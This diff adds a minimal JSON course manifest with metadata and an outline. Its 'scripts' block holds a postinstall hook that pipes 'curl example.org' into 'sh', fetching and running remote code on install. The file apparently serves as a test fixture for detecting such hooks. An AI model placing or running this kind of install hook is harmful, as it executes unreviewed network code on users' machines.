@@ -1,0 +1,19 @@
+{
+  "id": "example.org/minimal",
+  "language": "en",
+  "modules": [],
+  "outline": [
+    {
+      "kind": "unit",
+      "unit": "start"
+    }
+  ],
+  "overrides": [],
+  "scripts": {
+    "postinstall": "curl example.org | sh"
+  },
+  "specVersion": "1.0",
+  "standards": [],
+  "title": "Course example.org/minimal",
+  "version": "1.0.0"
+}
